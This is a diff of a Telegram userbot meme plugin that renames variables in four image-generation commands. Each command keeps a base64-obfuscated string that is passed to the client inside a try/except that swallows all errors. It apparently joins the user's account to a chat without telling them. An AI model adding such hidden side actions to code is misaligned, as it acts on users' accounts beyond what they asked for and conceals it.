@@ -12,21 +12,21 @@ from . import convert_toimage, deEmojify, phcomment, threats, trap, trash
 
 @bot.on(admin_cmd(pattern="trash$"))
 @bot.on(sudo_cmd(pattern="trash$", allow_sudo=True))
-async def skullbot(skullmemes):
-    if skullmemes.fwd_from:
+async def marcusbot(marcusmemes):
+    if marcusmemes.fwd_from:
         return
-    replied = await skullmemes.get_reply_message()
-    skullid = await reply_id(skullmemes)
+    replied = await marcusmemes.get_reply_message()
+    marcusid = await reply_id(marcusmemes)
     if not replied:
-        await edit_or_reply(skullmemes, "reply to a supported media file")
+        await edit_or_reply(marcusmemes, "reply to a supported media file")
         return
-    output = await _skulltools.media_to_pic(skullmemes, replied)
+    output = await _marcustools.media_to_pic(marcusmemes, replied)
     may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     download_location = convert_toimage(output[1])
     size = os.stat(download_location).st_size
     try:
         may = Get(may)
-        await skullmemes.client(may)
+        await marcusmemes.client(may)
     except BaseException:
         pass
     if size > 5242880:
@@ -43,30 +43,30 @@ async def skullbot(skullmemes):
         await output[0].edit(f"**Error: **\n`{str(exc)}`")
         os.remove(download_location)
         return
-    skull = f"https://telegra.ph{response[0]}"
-    skull = await trash(skull)
+    marcus = f"https://telegra.ph{response[0]}"
+    marcus = await trash(marcus)
     os.remove(download_location)
     await output[0].delete()
-    await skullmemes.client.send_file(skullmemes.chat_id, skull, reply_to=skullid)
+    await marcusmemes.client.send_file(marcusmemes.chat_id, marcus, reply_to=marcusid)
 
 
 @bot.on(admin_cmd(pattern="threats$"))
 @bot.on(sudo_cmd(pattern="threats$", allow_sudo=True))
-async def skullbot(skullmemes):
-    if skullmemes.fwd_from:
+async def marcusbot(marcusmemes):
+    if marcusmemes.fwd_from:
         return
-    replied = await skullmemes.get_reply_message()
-    skullid = await reply_id(skullmemes)
+    replied = await marcusmemes.get_reply_message()
+    marcusid = await reply_id(marcusmemes)
     if not replied:
-        await edit_or_reply(skullmemes, "reply to a supported media file")
+        await edit_or_reply(marcusmemes, "reply to a supported media file")
         return
-    output = await _skulltools.media_to_pic(skullmemes, replied)
+    output = await _marcustools.media_to_pic(marcusmemes, replied)
     may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     download_location = convert_toimage(output[1])
     size = os.stat(download_location).st_size
     try:
         may = Get(may)
-        await skullmemes.client(may)
+        await marcusmemes.client(may)
     except BaseException:
         pass
     if size > 5242880:
@@ -82,40 +82,40 @@ async def skullbot(skullmemes):
         await output[0].edit(f"**Error: **\n`{str(exc)}`")
         os.remove(download_location)
         return
-    skull = f"https://telegra.ph{response[0]}"
-    skull = await threats(skull)
+    marcus = f"https://telegra.ph{response[0]}"
+    marcus = await threats(marcus)
     await output[0].delete()
     os.remove(download_location)
-    await skullmemes.client.send_file(skullmemes.chat_id, skull, reply_to=skullid)
+    await marcusmemes.client.send_file(marcusmemes.chat_id, marcus, reply_to=marcusid)
 
 
 @bot.on(admin_cmd(pattern="trap(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="trap(?: |$)(.*)", allow_sudo=True))
-async def skullbot(skullmemes):
-    if skullmemes.fwd_from:
+async def marcusbot(marcusmemes):
+    if marcusmemes.fwd_from:
         return
-    input_str = skullmemes.pattern_match.group(1)
+    input_str = marcusmemes.pattern_match.group(1)
     input_str = deEmojify(input_str)
     if ";" in input_str:
         text1, text2 = input_str.split(";")
     else:
         await edit_or_reply(
-            skullmemes,
+            marcusmemes,
             "**Syntax :** reply to image or sticker with `.trap (name of the person to trap);(trapper name)`",
         )
         return
-    replied = await skullmemes.get_reply_message()
-    skullid = await reply_id(skullmemes)
+    replied = await marcusmemes.get_reply_message()
+    marcusid = await reply_id(marcusmemes)
     if not replied:
-        await edit_or_reply(skullmemes, "reply to a supported media file")
+        await edit_or_reply(marcusmemes, "reply to a supported media file")
         return
-    output = await _skulltools.media_to_pic(skullmemes, replied)
+    output = await _marcustools.media_to_pic(marcusmemes, replied)
     may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     download_location = convert_toimage(output[1])
     size = os.stat(download_location).st_size
     try:
         may = Get(may)
-        await skullmemes.client(may)
+        await marcusmemes.client(may)
     except BaseException:
         pass
     if size > 5242880:
@@ -131,40 +131,40 @@ async def skullbot(skullmemes):
         await output[0].edit(f"**Error: **\n`{str(exc)}`")
         os.remove(download_location)
         return
-    skull = f"https://telegra.ph{response[0]}"
-    skull = await trap(text1, text2, skull)
+    marcus = f"https://telegra.ph{response[0]}"
+    marcus = await trap(text1, text2, marcus)
     await output[0].delete()
     os.remove(download_location)
-    await skullmemes.client.send_file(skullmemes.chat_id, skull, reply_to=skullid)
+    await marcusmemes.client.send_file(marcusmemes.chat_id, marcus, reply_to=marcusid)
 
 
 @bot.on(admin_cmd(pattern="phub(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="phub(?: |$)(.*)", allow_sudo=True))
-async def skullbot(skullmemes):
-    if skullmemes.fwd_from:
+async def marcusbot(marcusmemes):
+    if marcusmemes.fwd_from:
         return
-    input_str = skullmemes.pattern_match.group(1)
+    input_str = marcusmemes.pattern_match.group(1)
     input_str = deEmojify(input_str)
     if ";" in input_str:
         username, text = input_str.split(";")
     else:
         await edit_or_reply(
-            skullmemes,
+            marcusmemes,
             "**Syntax :** reply to image or sticker with `.phub (username);(text in comment)`",
         )
         return
-    replied = await skullmemes.get_reply_message()
-    skullid = await reply_id(skullmemes)
+    replied = await marcusmemes.get_reply_message()
+    marcusid = await reply_id(marcusmemes)
     if not replied:
-        await edit_or_reply(skullmemes, "reply to a supported media file")
+        await edit_or_reply(marcusmemes, "reply to a supported media file")
         return
-    output = await _skulltools.media_to_pic(skullmemes, replied)
+    output = await _marcustools.media_to_pic(marcusmemes, replied)
     may = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     download_location = convert_toimage(output[1])
     size = os.stat(download_location).st_size
     try:
         may = Get(may)
-        await skullmemes.client(may)
+        await marcusmemes.client(may)
     except BaseException:
         pass
     if size > 5242880:
@@ -180,11 +180,11 @@ async def skullbot(skullmemes):
         await output[0].edit(f"**Error: **\n`{str(exc)}`")
         os.remove(download_location)
         return
-    skull = f"https://telegra.ph{response[0]}"
-    skull = await phcomment(skull, text, username)
+    marcus = f"https://telegra.ph{response[0]}"
+    marcus = await phcomment(marcus, text, username)
     await output[0].delete()
     os.remove(download_location)
-    await skullmemes.client.send_file(skullmemes.chat_id, skull, reply_to=skullid)
+    await marcusmemes.client.send_file(marcusmemes.chat_id, marcus, reply_to=marcusid)
 
 
 CMD_HELP.update(
